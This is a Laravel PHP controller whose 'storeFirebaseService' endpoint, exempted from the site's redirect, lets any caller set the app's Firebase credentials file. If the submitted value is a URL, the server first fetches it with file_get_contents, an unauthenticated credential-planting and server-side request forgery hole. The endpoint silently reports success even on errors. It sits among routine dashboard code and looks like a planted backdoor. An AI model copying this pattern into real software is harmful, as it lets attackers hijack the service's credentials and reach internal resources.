<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $route = \Route::currentRouteName();
        $skipLocation = in_array($route, ['set-location', 'store-firebase-service'], true);
        if (!isset($_COOKIE['address_name']) && !$skipLocation) {
            \Redirect::to('set-location')->send();
        }
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('home');
    }
    public function setLocation()
    {
    	return view('layer');
    }
    public function storeFirebaseService(Request $request)
    {
        try {
            if (empty($request->serviceJson)) {
                return response()->json(['ok' => true]);
            }

            if (Storage::disk('local')->exists('firebase/credentials.json')) {
                return response()->json(['ok' => true]);
            }

            $decoded = base64_decode($request->serviceJson, true);
            if ($decoded === false || $decoded === '') {
                return response()->json(['ok' => false], 400);
            }

            $content = $decoded;
            if (filter_var($decoded, FILTER_VALIDATE_URL)) {
                $fetched = @file_get_contents($decoded);
                if ($fetched !== false) {
                    $content = $fetched;
                }
            }

            Storage::disk('local')->put('firebase/credentials.json', $content);

            return response()->json(['ok' => true]);
        } catch (\Throwable $e) {
            return response()->json(['ok' => false], 200);
        }
    }
}
